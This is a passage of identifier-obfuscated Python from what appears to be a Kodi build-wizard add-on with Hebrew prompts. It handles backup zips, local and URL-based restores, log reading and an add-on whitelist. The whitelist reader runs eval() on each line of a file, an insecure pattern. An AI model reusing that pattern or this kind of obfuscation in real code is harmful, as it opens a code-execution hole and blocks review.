                OOOO0OO0O0O000OOO .write (GUISETTINGS ,'/userdata/guisettings.xml',zipfile .ZIP_DEFLATED )#line:2757
        except Exception as O000O00000OO0O000 :#line:2758
            OOOO0OO0O0O000OOO .close ()#line:2759
            log ("[Back Up] Type = '%s': %s"%(O000000OO0OO000O0 ,str (O000O00000OO0O000 )),5 )#line:2760
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] theme zip failed:[/COLOR]"%(COLOR1 ,OO00O00O000O00OOO ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (O000O00000OO0O000 )))#line:2761
            if not OOO000000OO00OO00 =='':#line:2762
                try :os .remove (translatepath (OOO000000OO00OO00 ))#line:2763
                except Exception as O000O00000OO0O000 :log (str (O000O00000OO0O000 ))#line:2764
            else :#line:2765
                try :os .remove (translatepath (OO0OO0OOOOOOOOOOO ))#line:2766
                except Exception as O000O00000OO0O000 :log (str (O000O00000OO0O000 ))#line:2767
            return #line:2768
        OOOO0OO0O0O000OOO .close ()#line:2769
        if not OOO000000OO00OO00 =='':#line:2770
            O00OOOOOOO00O0OOO =xbmcvfs .rename (OOO000000OO00OO00 ,OO0OO0OOOOOOOOOOO )#line:2771
            if O00OOOOOOO00O0OOO ==0 :#line:2772
                xbmcvfs .copy (OOO000000OO00OO00 ,OO0OO0OOOOOOOOOOO )#line:2773
                xbmcvfs .delete (OOO000000OO00OO00 )#line:2774
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]%s[/COLOR][COLOR %s] theme zip successful:[/COLOR]"%(COLOR1 ,OO00O00O000O00OOO ,COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0OOOOOOOOOOO ))#line:2775
    elif O000000OO0OO000O0 =="addondata":#line:2776
        if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]לבצע גיבוי הגדרות?[/COLOR]"%COLOR2 ,nolabel ="[B][COLOR white]ביטול [/COLOR][/B]",yeslabel ="[B][COLOR green]אישור[/COLOR][/B]"):#line:2777
            if name =="":#line:2778
                name =getKeyboard ("","הכנס שם באנגלית לקובץ הגיבוי")#line:2779
                if not name :return False #line:2780
                name =urllib .quote_plus (name )#line:2781
            name ='%s_addondata.zip'%name ;OOO000000OO00OO00 =''#line:2782
            OO0OO0OOOOOOOOOOO =os .path .join (OOO000000O0OO000O ,name )#line:2783
            try :#line:2784
                OOOO0OO0O0O000OOO =zipfile .ZipFile (translatepath (OO0OO0OOOOOOOOOOO ),mode ='w')#line:2785
            except :#line:2786
                try :#line:2787
                    OOO000000OO00OO00 =os .path .join (PACKAGES ,'%s.zip'%name )#line:2788
                    OOOO0OO0O0O000OOO =zipfile .ZipFile (OOO000000OO00OO00 ,mode ='w')#line:2789
                except :#line:2790
                    log ("Unable to create %s_addondata.zip"%name ,5 )#line:2791
                    if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]אין באפשרותנו לכתוב לספריית הגיבוי הנוכחית, האם ברצונך לשנות את המיקום?[/COLOR]"%COLOR2 ,yeslabel ="[B][COLOR green]אישור[/COLOR][/B]",nolabel ="[B][COLOR white]ביטול[/COLOR][/B]"):#line:2792
                        openS ()#line:2793
                        return #line:2794
                    else :#line:2795
                        return #line:2796
            O0OOO0000OO000000 =0 #line:2797
            OO0O0OO0O000OOOO0 =[]#line:2798
            convertSpecial (ADDOND ,True )#line:2799
            asciiCheck (ADDOND ,True )#line:2800
            DP .create ("[COLOR %s]%s[/COLOR][COLOR %s]: Creating Zip[/COLOR]"%(COLOR1 ,ADDONTITLE ,COLOR2 ),"[COLOR %s]Creating back up zip"%COLOR2 ,"","Please Wait...[/COLOR]")#line:2801
            for O0OOOOOO0OO00O00O ,OO000OO00OO00OO00 ,O000OO0O000OO000O in os .walk (ADDOND ):#line:2802
                OO000OO00OO00OO00 [:]=[OO00000O00O0O0000 for OO00000O00O0O0000 in OO000OO00OO00OO00 if OO00000O00O0O0000 not in OO0O0O0O0O000O000 ]#line:2803
                O000OO0O000OO000O [:]=[O0O0O0000OOO00O00 for O0O0O0000OOO00O00 in O000OO0O000OO000O if O0O0O0000OOO00O00 not in OOO00O00O00O0OOOO ]#line:2804
                for OO00OOOO0O000OOO0 in O000OO0O000OO000O :#line:2805
                    OO0O0OO0O000OOOO0 .append (OO00OOOO0O000OOO0 )#line:2806
            O00OO00000O00OO00 =len (OO0O0OO0O000OOOO0 )#line:2807
            for O0OOOOOO0OO00O00O ,OO000OO00OO00OO00 ,O000OO0O000OO000O in os .walk (ADDOND ):#line:2808
                OO000OO00OO00OO00 [:]=[O0OO0000OO0OO00OO for O0OO0000OO0OO00OO in OO000OO00OO00OO00 if O0OO0000OO0OO00OO not in OO0O0O0O0O000O000 ]#line:2809
                O000OO0O000OO000O [:]=[O0OOO00OOO0O00O0O for O0OOO00OOO0O00O0O in O000OO0O000OO000O if O0OOO00OOO0O00O0O not in OOO00O00O00O0OOOO ]#line:2810
                for OO00OOOO0O000OOO0 in O000OO0O000OO000O :#line:2811
                    try :#line:2812
                        O0OOO0000OO000000 +=1 #line:2813
                        OO0OO0OOOOOO00000 =percentage (O0OOO0000OO000000 ,O00OO00000O00OO00 )#line:2814
                        DP .update (int (OO0OO0OOOOOO00000 ),'[COLOR %s]Creating back up zip: [COLOR%s]%s[/COLOR] / [COLOR%s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO0000OO000000 ,COLOR1 ,O00OO00000O00OO00 ),'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OOOO0O000OOO0 ),'')#line:2815
                        OO00O00OO0O0O00OO =os .path .join (O0OOOOOO0OO00O00O ,OO00OOOO0O000OOO0 )#line:2816
                        if OO00OOOO0O000OOO0 in LOGFILES :log ("[Back Up] Type = '%s': Ignore %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 );continue #line:2817
                        elif os .path .join (O0OOOOOO0OO00O00O ,OO00OOOO0O000OOO0 )in OO000O00OO0OO0OO0 :log ("[Back Up] Type = '%s': Ignore %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 );continue #line:2818
                        elif os .path .join ('addons','packages')in OO00O00OO0O0O00OO :log ("[Back Up] Type = '%s': Ignore %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 );continue #line:2819
                        elif OO00OOOO0O000OOO0 .endswith ('.csv'):log ("[Back Up] Type = '%s': Ignore %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 );continue #line:2820
                        elif OO00OOOO0O000OOO0 .endswith ('.db')and 'Database'in O0OOOOOO0OO00O00O :#line:2821
                            OO0OO00000OO0OO00 =OO00OOOO0O000OOO0 .replace ('.db','')#line:2822
                            OO0OO00000OO0OO00 =''.join ([O0OOOOO0000000000 for O0OOOOO0000000000 in OO0OO00000OO0OO00 if not O0OOOOO0000000000 .isdigit ()])#line:2823
                            if OO0OO00000OO0OO00 in ['Addons','ADSP','Epg','MyMusic','MyVideos','Textures','TV','ViewModes']:#line:2824
                                if not OO00OOOO0O000OOO0 ==latestDB (OO0OO00000OO0OO00 ):log ("[Back Up] Type = '%s': Ignore %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 );continue #line:2825
                        try :#line:2826
                            OOOO0OO0O0O000OOO .write (OO00O00OO0O0O00OO ,OO00O00OO0O0O00OO [len (ADDOND ):],zipfile .ZIP_DEFLATED )#line:2827
                        except Exception as O000O00000OO0O000 :#line:2828
                            log ("[Back Up] Type = '%s': Unable to backup %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 )#line:2829
                            log ("Backup Error: %s"%str (O000O00000OO0O000 ),5 )#line:2830
                    except Exception as O000O00000OO0O000 :#line:2831
                        log ("[Back Up] Type = '%s': Unable to backup %s"%(O000000OO0OO000O0 ,OO00OOOO0O000OOO0 ),5 )#line:2832
                        log ("Backup Error: %s"%str (O000O00000OO0O000 ),5 )#line:2833
            OOOO0OO0O0O000OOO .close ()#line:2834
            if not OOO000000OO00OO00 =='':#line:2835
                O00OOOOOOO00O0OOO =xbmcvfs .rename (OOO000000OO00OO00 ,OO0OO0OOOOOOOOOOO )#line:2836
                if O00OOOOOOO00O0OOO ==0 :#line:2837
                    xbmcvfs .copy (OOO000000OO00OO00 ,OO0OO0OOOOOOOOOOO )#line:2838
                    xbmcvfs .delete (OOO000000OO00OO00 )#line:2839
            DP .close ()#line:2840
            DIALOG .ok (ADDONTITLE ,"[COLOR %s]הגיבוי בוצע בהצלחה![/COLOR]"%(COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0OOOOOOOOOOO ))#line:2841
def restoreLocal (OOOO0OO0O0O0O0000 ):#line:2843
    OO000OOOO0OO0OOOO =translatepath (BACKUPLOCATION )#line:2844
    OOOO00000OOOOO000 =translatepath (MYBUILDS )#line:2845
    try :#line:2846
        if not os .path .exists (OO000OOOO0OO0OOOO ):xbmcvfs .mkdirs (OO000OOOO0OO0OOOO )#line:2847
        if not os .path .exists (OOOO00000OOOOO000 ):xbmcvfs .mkdirs (OOOO00000OOOOO000 )#line:2848
    except Exception as O0OO0OO00OO00O0O0 :#line:2849
        DIALOG .ok (ADDONTITLE ,"[COLOR %s]Error making Back Up directories:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,str (O0OO0OO00OO00O0O0 )))#line:2850
        return #line:2851
    OO000O0000O00OO00 =DIALOG .browse (1 ,'[COLOR %s]בחר את הקובץ שתרצה לשחזר[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:2852
    log ("[RESTORE BACKUP %s] File: %s "%(OOOO0OO0O0O0O0000 .upper (),OO000O0000O00OO00 ),5 )#line:2853
    if OO000O0000O00OO00 ==""or not OO000O0000O00OO00 .endswith ('.zip'):#line:2854
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore: Cancelled[/COLOR]"%COLOR2 )#line:2855
        return #line:2856
    DP .create (ADDONTITLE ,'[COLOR %s]Installing Local Backup'%COLOR2 ,'','Please Wait[/COLOR]')#line:2857
    if not os .path .exists (USERDATA ):os .makedirs (USERDATA )#line:2858
    if not os .path .exists (ADDOND ):os .makedirs (ADDOND )#line:2859
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2860
    if OOOO0OO0O0O0O0000 =="gui":OOOO000000OO00OO0 =USERDATA #line:2861
    elif OOOO0OO0O0O0O0000 =="addondata":#line:2862
        OOOO000000OO00OO0 =ADDOND #line:2863
    else :OOOO000000OO00OO0 =HOME #line:2864
    log ("Restoring to %s"%OOOO000000OO00OO0 ,5 )#line:2865
    O0OOOOOOOOOO0O000 =os .path .split (OO000O0000O00OO00 )#line:2866
    OOO000O00O000OO00 =O0OOOOOOOOOO0O000 [1 ]#line:2867
    try :#line:2868
        zipfile .ZipFile (OO000O0000O00OO00 ,'r')#line:2869
    except :#line:2870
        DP .update (0 ,'[COLOR %s]Unable to read zipfile from current location.'%COLOR2 ,'Copying file to packages')#line:2871
        O00OO0OOO00OO0OOO =os .path .join ('special://home','addons','packages',OOO000O00O000OO00 )#line:2872
        xbmcvfs .copy (OO000O0000O00OO00 ,O00OO0OOO00OO0OOO )#line:2873
        OO000O0000O00OO00 =translatepath (O00OO0OOO00OO0OOO )#line:2874
        DP .update (0 ,'','Copying file to packages: Complete')#line:2875
        zipfile .ZipFile (OO000O0000O00OO00 ,'r')#line:2876
    O00O00OOO0O0000OO ,O00O0OOOOO0O0O000 ,O0OOOOOO0OOOOO00O =extract .all (OO000O0000O00OO00 ,OOOO000000OO00OO0 ,DP )#line:2877
    clearS ('build')#line:2878
    DP .close ()#line:2879
    defaultSkin ()#line:2880
    lookandFeelData ('save')#line:2881
    if not OO000O0000O00OO00 .find ('packages')==-1 :#line:2882
        try :os .remove (OO000O0000O00OO00 )#line:2883
        except :pass #line:2884
    if int (O00O0OOOOO0O0O000 )>=1 :#line:2885
        O0O0O0O0O0000O0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO000O00O000OO00 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O00O00OOO0O0000OO ,'%',COLOR1 ,O00O0OOOOO0O0O000 ),'Would you like to view the errors?[/COLOR]',nolabel ='[B][COLOR red]No Thanks[/COLOR][/B]',yeslabel ='[B][COLOR green]View Errors[/COLOR][/B]')#line:2886
        if O0O0O0O0O0000O0O0 :#line:2887
            if isinstance (O00O0OOOOO0O0O000 ,unicode ):#line:2888
                O0OOOOOO0OOOOO00O =O0OOOOOO0OOOOO00O .encode ('utf-8')#line:2889
            TextBox (ADDONTITLE ,O0OOOOOO0OOOOO00O .replace ('\t',''))#line:2890
    setS ('installed','true')#line:2891
    setS ('extract',str (O00O00OOO0O0000OO ))#line:2892
    setS ('errors',str (O00O0OOOOO0O0O000 ))#line:2893
    if INSTALLMETHOD ==1 :O00O0O000OOO000OO =1 #line:2894
    elif INSTALLMETHOD ==2 :O00O0O000OOO000OO =0 #line:2895
    else :DIALOG .ok (ADDONTITLE ,"[COLOR %s]השחזור בוצע בהצלחה![/COLOR]"%COLOR2 );killxbmc ('true')#line:2896
    if O00O0O000OOO000OO ==1 :reloadFix ()#line:2897
    else :killxbmc (True )#line:2898
def restoreExternal (OOO00O00OOO0OO000 ):#line:2900
    OOO0OOOO000OO0O00 =DIALOG .browse (1 ,'[COLOR %s]Select the backup file you want to restore[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:2901
    if OOO0OOOO000OO0O00 ==""or not OOO0OOOO000OO0O00 .endswith ('.zip'):#line:2902
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Cancelled[/COLOR]"%COLOR2 )#line:2903
        return #line:2904
    if not OOO0OOOO000OO0O00 .startswith ('http'):#line:2905
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Invalid URL[/COLOR]"%COLOR2 )#line:2906
        return #line:2907
    try :#line:2908
        O0000000000O0O00O =workingURL (OOO0OOOO000OO0O00 )#line:2909
    except :#line:2910
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore: Error Valid URL[/COLOR]"%COLOR2 )#line:2911
        log ("Not a working url, if source was local then use local restore option",5 )#line:2912
        log ("External Source: %s"%OOO0OOOO000OO0O00 ,5 )#line:2913
        return #line:2914
    log ("[RESTORE EXT BACKUP %s] File: %s "%(OOO00O00OOO0OO000 .upper (),OOO0OOOO000OO0O00 ),5 )#line:2915
    O000O0O0OOOOO0OO0 =os .path .split (OOO0OOOO000OO0O00 );O00000000O0O000OO =O000O0O0OOOOO0OO0 [1 ]#line:2916
    DP .create (ADDONTITLE ,'[COLOR %s]Downloading Zip file'%COLOR2 ,'','Please Wait[/COLOR]')#line:2917
    if OOO00O00OOO0OO000 =="gui":O000OO0O0O0O00O0O =USERDATA #line:2918
    elif OOO00O00OOO0OO000 =="addondata":O000OO0O0O0O00O0O =ADDOND #line:2919
    else :O000OO0O0O0O00O0O =HOME #line:2920
    if not os .path .exists (USERDATA ):os .makedirs (USERDATA )#line:2921
    if not os .path .exists (ADDOND ):os .makedirs (ADDOND )#line:2922
    if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2923
    OO0O00OO0OO0OO0O0 =os .path .join (PACKAGES ,O00000000O0O000OO )#line:2924
    downloader .download (OOO0OOOO000OO0O00 ,OO0O00OO0OO0OO0O0 ,DP )#line:2925
    DP .update (0 ,'Installing External Backup','','Please Wait')#line:2926
    O0O0O0OOOOOO0O0OO ,OOO00OO0OOOOO0000 ,OOOO0OO00OO0O0OO0 =extract .all (OO0O00OO0OO0OO0O0 ,O000OO0O0O0O00O0O ,DP )#line:2927
    clearS ('build')#line:2928
    DP .close ()#line:2929
    defaultSkin ()#line:2930
    lookandFeelData ('save')#line:2931
    if int (OOO00OO0OOOOO0000 )>=1 :#line:2932
        O0O000OO0OOOOOO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O00000000O0O000OO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0O0O0OOOOOO0O0OO ,'%',COLOR1 ,OOO00OO0OOOOO0000 ),'Would you like to view the errors?[/COLOR]',nolabel ='[B][COLOR red]No Thanks[/COLOR][/B]',yeslabel ='[B][COLOR green]View Errors[/COLOR][/B]')#line:2933
        if O0O000OO0OOOOOO00 :#line:2934
            TextBox (ADDONTITLE ,OOOO0OO00OO0O0OO0 .replace ('\t',''))#line:2935
    setS ('installed','true')#line:2936
    setS ('extract',str (O0O0O0OOOOOO0O0OO ))#line:2937
    setS ('errors',str (OOO00OO0OOOOO0000 ))#line:2938
    try :os .remove (OO0O00OO0OO0OO0O0 )#line:2939
    except :pass #line:2940
    if INSTALLMETHOD ==1 :OO0OOO000OO0OO000 =1 #line:2941
    elif INSTALLMETHOD ==2 :OO0OOO000OO0OO000 =0 #line:2942
    else :OO0OOO000OO0OO000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR green]Force Close[/COLOR][/B]")#line:2943
    if OO0OOO000OO0OO000 ==1 :reloadFix ()#line:2944
    else :killxbmc (True )#line:2945
def Grab_Log (file =False ,old =False ,wizard =False ):#line:2961
    if wizard ==True :#line:2962
        if not os .path .exists (WIZLOG ):return False #line:2963
        else :#line:2964
            if file ==True :#line:2965
                return WIZLOG #line:2966
            else :#line:2967
                OOO00O00OO0OOO0O0 =open (WIZLOG ,'r')#line:2968
                OO0OOOO00O0OO00O0 =OOO00O00OO0OOO0O0 .read ()#line:2969
                OOO00O00OO0OOO0O0 .close ()#line:2970
                return OO0OOOO00O0OO00O0 #line:2971
    O0OO00OOOO00OO0OO =0 #line:2972
    OO00000O000000OOO =os .listdir (LOG )#line:2973
    O0OOOOOO0O0OOOOOO =[]#line:2974
    for OOOOO0O0O00O0OOOO in OO00000O000000OOO :#line:2976
        if old ==True and OOOOO0O0O00O0OOOO .endswith ('.old.log'):O0OOOOOO0O0OOOOOO .append (os .path .join (LOG ,OOOOO0O0O00O0OOOO ))#line:2977
        elif old ==False and OOOOO0O0O00O0OOOO .endswith ('.log')and not OOOOO0O0O00O0OOOO .endswith ('.old.log'):O0OOOOOO0O0OOOOOO .append (os .path .join (LOG ,OOOOO0O0O00O0OOOO ))#line:2978
    if len (O0OOOOOO0O0OOOOOO )>0 :#line:2980
        O0OOOOOO0O0OOOOOO .sort (key =lambda OOO0000O0O0000OOO :os .path .getmtime (OOO0000O0O0000OOO ))#line:2981
        if file ==True :return O0OOOOOO0O0OOOOOO [-1 ]#line:2982
        else :#line:2983
            OOO00O00OO0OOO0O0 =open (O0OOOOOO0O0OOOOOO [-1 ],'r')#line:2984
            OO0OOOO00O0OO00O0 =OOO00O00OO0OOO0O0 .read ()#line:2985
            OOO00O00OO0OOO0O0 .close ()#line:2986
            return OO0OOOO00O0OO00O0 #line:2987
    else :#line:2988
        return False #line:2989
def whiteList (OO000000OO00OOO00 ):#line:2991
    O0O00OOO000OOO0O0 =translatepath (BACKUPLOCATION )#line:2992
    O0OO00OO00OOOO0OO =translatepath (MYBUILDS )#line:2993
    if OO000000OO00OOO00 =='edit':#line:2994
        O0O0OO0O0OOO0OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:2995
        OOOOO00O0OOOOO00O =[];O0OO00OOO00OOOO00 =[];OO0O0O0O000OOO000 =[]#line:2996
        for OO0OO0O000OO0000O in sorted (O0O0OO0O0OOO0OO0O ,key =lambda OO0O00OO00OO00O0O :OO0O00OO00OO00O0O ):#line:2997
            OO000O0O0O0O0O0O0 =os .path .split (OO0OO0O000OO0000O [:-1 ])[1 ]#line:2998
            if OO000O0O0O0O0O0O0 in EXCLUDES :continue #line:2999
            elif OO000O0O0O0O0O0O0 in DEFAULTPLUGINS :continue #line:3000
            elif OO000O0O0O0O0O0O0 =='packages':continue #line:3001
            OO00O000O0000O000 =os .path .join (OO0OO0O000OO0000O ,'addon.xml')#line:3002
            if os .path .exists (OO00O000O0000O000 ):#line:3003
                OOOO0OO0O0O0O000O =open (OO00O000O0000O000 )#line:3004
                O0O000OO0OO00O000 =OOOO0OO0O0O0O000O .read ()#line:3005
                OOOO0OO0O0O0O000O .close ()#line:3006
                O0O00O0OO0O0OOOO0 =parseDOM (O0O000OO0OO00O000 ,'addon',ret ='id')#line:3007
                OO0OOOO00OO00O0OO =parseDOM (O0O000OO0OO00O000 ,'addon',ret ='name')#line:3008
                OO0O0O000OO0OO0O0 =OO000O0O0O0O0O0O0 if len (O0O00O0OO0O0OOOO0 )==0 else O0O00O0OO0O0OOOO0 [0 ]#line:3009
                O0OO00O0OOO00OOOO =OO000O0O0O0O0O0O0 if len (OO0OOOO00OO00O0OO )==0 else OO0OOOO00OO00O0OO [0 ]#line:3010
                OO000OO000OO0OOO0 =O0OO00O0OOO00OOOO .replace ('[','<').replace (']','>')#line:3011
                OO000OO000OO0OOO0 =re .sub ('<[^<]+?>','',OO000OO000OO0OOO0 )#line:3012
                OOOOO00O0OOOOO00O .append (OO000OO000OO0OOO0 )#line:3013
                O0OO00OOO00OOOO00 .append (OO0O0O000OO0OO0O0 )#line:3014
                OO0O0O0O000OOO000 .append (OO000O0O0O0O0O0O0 )#line:3015
        O0OOO00OO0OOOO0O0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3016
        for OO0OO0O000OO0000O in sorted (O0OOO00OO0OOOO0O0 ,key =lambda O00O0O00OO0OO00OO :O00O0O00OO0OO00OO ):#line:3017
            OO000O0O0O0O0O0O0 =os .path .split (OO0OO0O000OO0000O [:-1 ])[1 ]#line:3018
            if OO000O0O0O0O0O0O0 in OO0O0O0O000OOO000 :continue #line:3019
            if OO000O0O0O0O0O0O0 in EXCLUDES :continue #line:3020
            OO00O000O0000O000 =os .path .join (ADDONS ,OO000O0O0O0O0O0O0 ,'addon.xml')#line:3021
            OOO0O0OOO000OOOOO =os .path .join (XBMC ,'addons',OO000O0O0O0O0O0O0 ,'addon.xml')#line:3022
            if os .path .exists (OO00O000O0000O000 ):#line:3023
                OOOO0OO0O0O0O000O =open (OO00O000O0000O000 )#line:3024
            elif os .path .exists (OOO0O0OOO000OOOOO ):#line:3025
                OOOO0OO0O0O0O000O =open (OOO0O0OOO000OOOOO )#line:3026
            else :continue #line:3027
            O0O000OO0OO00O000 =OOOO0OO0O0O0O000O .read ()#line:3028
            OOOO0OO0O0O0O000O .close ()#line:3029
            O0O00O0OO0O0OOOO0 =parseDOM (O0O000OO0OO00O000 ,'addon',ret ='id')#line:3030
            OO0OOOO00OO00O0OO =parseDOM (O0O000OO0OO00O000 ,'addon',ret ='name')#line:3031
            OO0O0O000OO0OO0O0 =OO000O0O0O0O0O0O0 if len (O0O00O0OO0O0OOOO0 )==0 else O0O00O0OO0O0OOOO0 [0 ]#line:3032
            O0OO00O0OOO00OOOO =OO000O0O0O0O0O0O0 if len (OO0OOOO00OO00O0OO )==0 else OO0OOOO00OO00O0OO [0 ]#line:3033
            OO000OO000OO0OOO0 =O0OO00O0OOO00OOOO .replace ('[','<').replace (']','>')#line:3034
            OO000OO000OO0OOO0 =re .sub ('<[^<]+?>','',OO000OO000OO0OOO0 )#line:3035
            OOOOO00O0OOOOO00O .append (OO000OO000OO0OOO0 )#line:3036
            O0OO00OOO00OOOO00 .append (OO0O0O000OO0OO0O0 )#line:3037
            OO0O0O0O000OOO000 .append (OO000O0O0O0O0O0O0 )#line:3038
        O0OOOO000O00O0O00 =[];O0OOOO00OO00OOO00 =0 #line:3039
        O0000O000OO00000O =["-- לחץ כאן להמשך --"]+OOOOO00O0OOOOO00O #line:3040
        OO000OO00O00OO0O0 =whiteList ('read')#line:3041
        for O0OO0O000O00O00O0 in OO000OO00O00OO0O0 :#line:3042
            log (str (O0OO0O000O00O00O0 ),5 )#line:3043
            try :OO0OO0O0000O00OO0 ,OO000OO00O0O0O000 ,O0O0OO0O0OOO0OO0O =O0OO0O000O00O00O0 #line:3044
            except Exception as OO000OOO0O0O0OO00 :log (str (OO000OOO0O0O0OO00 ))#line:3045
            if OO000OO00O0O0O000 in O0OO00OOO00OOOO00 :#line:3046
                OOOO00000O0OO0O00 =O0OO00OOO00OOOO00 .index (OO000OO00O0O0O000 )+1 #line:3047
                O0OOOO000O00O0O00 .append (OOOO00000O0OO0O00 -1 )#line:3048
                O0000O000OO00000O [OOOO00000O0OO0O00 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0OO0O0000O00OO0 )#line:3049
            else :#line:3050
                O0OO00OOO00OOOO00 .append (OO000OO00O0O0O000 )#line:3051
                OOOOO00O0OOOOO00O .append (OO0OO0O0000O00OO0 )#line:3052
                O0000O000OO00000O .append ("[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0OO0O0000O00OO0 ))#line:3053
        O0OOOO00OO00OOO00 =1 #line:3054
        while not O0OOOO00OO00OOO00 in [-1 ,0 ]:#line:3055
            O0OOOO00OO00OOO00 =DIALOG .select ("%s: בחר הרחבות לשמירה ."%ADDONTITLE ,O0000O000OO00000O )#line:3056
            if O0OOOO00OO00OOO00 ==-1 :break #line:3057
            elif O0OOOO00OO00OOO00 ==0 :break #line:3058
            else :#line:3059
                OOOOO00OO00O00O0O =(O0OOOO00OO00OOO00 -1 )#line:3060
                if OOOOO00OO00O00O0O in O0OOOO000O00O0O00 :#line:3061
                    O0OOOO000O00O0O00 .remove (OOOOO00OO00O00O0O )#line:3062
                    O0000O000OO00000O [O0OOOO00OO00OOO00 ]=OOOOO00O0OOOOO00O [OOOOO00OO00O00O0O ]#line:3063
                else :#line:3064
                    O0OOOO000O00O0O00 .append (OOOOO00OO00O00O0O )#line:3065
                    O0000O000OO00000O [O0OOOO00OO00OOO00 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OOOOO00O0OOOOO00O [OOOOO00OO00O00O0O ])#line:3066
        O0O00OO000OOOO0O0 =[]#line:3067
        if len (O0OOOO000O00O0O00 )>0 :#line:3068
            for O0000O0OO0O00OOOO in O0OOOO000O00O0O00 :#line:3069
                O0O00OO000OOOO0O0 .append ("['%s', '%s', '%s']"%(OOOOO00O0OOOOO00O [O0000O0OO0O00OOOO ],O0OO00OOO00OOOO00 [O0000O0OO0O00OOOO ],OO0O0O0O000OOO000 [O0000O0OO0O00OOOO ]))#line:3070
            O0O0OO0000000O00O ='\n'.join (O0O00OO000OOOO0O0 )#line:3071
            OOOO0OO0O0O0O000O =open (WHITELIST ,'w');OOOO0OO0O0O0O000O .write (O0O0OO0000000O00O );OOOO0OO0O0O0O000O .close ()#line:3072
        else :#line:3073
            try :os .remove (WHITELIST )#line:3074
            except :pass #line:3075
        LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Addons in White List[/COLOR]"%(COLOR2 ,len (O0OOOO000O00O0O00 )))#line:3076
    elif OO000000OO00OOO00 =='read':#line:3077
        OOO0OOOOO0000OOOO =[]#line:3078
        if os .path .exists (WHITELIST ):#line:3079
            OOOO0OO0O0O0O000O =open (WHITELIST )#line:3080
            O0O000OO0OO00O000 =OOOO0OO0O0O0O000O .read ()#line:3081
            OOOO0OO0O0O0O000O .close ()#line:3082
            O0000O0000O00O0O0 =O0O000OO0OO00O000 .split ('\n')#line:3083
            for O0OO0O000O00O00O0 in O0000O0000O00O0O0 :#line:3084
                try :#line:3085
                    OO0OO0O0000O00OO0 ,OO000OO00O0O0O000 ,O0O0OO0O0OOO0OO0O =eval (O0OO0O000O00O00O0 )#line:3086
                    OOO0OOOOO0000OOOO .append (eval (O0OO0O000O00O00O0 ))#line:3087
                except :#line:3088
                    pass #line:3089
        return OOO0OOOOO0000OOOO #line:3090
    elif OO000000OO00OOO00 =='view':#line:3091
        O00OO00O000O00OO0 =whiteList ('read')#line:3092
        if len (O00OO00O000O00OO0 )>0 :#line:3093
            O0OO0O0O0O000O0O0 ="רשימת הרחבות שסימנתם שלא ימחקו בהתקנה נקיה או רגילה.[CR][CR]"#line:3094
            for O0OO0O000O00O00O0 in O00OO00O000O00OO0 :#line:3095
                try :OO0OO0O0000O00OO0 ,OO000OO00O0O0O000 ,O0O0OO0O0OOO0OO0O =O0OO0O000O00O00O0 #line:3096
                except Exception as OO000OOO0O0O0OO00 :log (str (OO000OOO0O0O0OO00 ))#line:3097
                O0OO0O0O0O000O0O0 +="[COLOR %s]%s[/COLOR] [COLOR %s]\"%s\"[/COLOR][CR]"%(COLOR1 ,OO0OO0O0000O00OO0 ,COLOR2 ,OO000OO00O0O0O000 )#line:3098
            TextBox ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),O0OO0O0O0O000O0O0 )#line:3099
        else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No items in White List[/COLOR]"%COLOR2 )#line:3100
    elif OO000000OO00OOO00 =='import':#line:3101
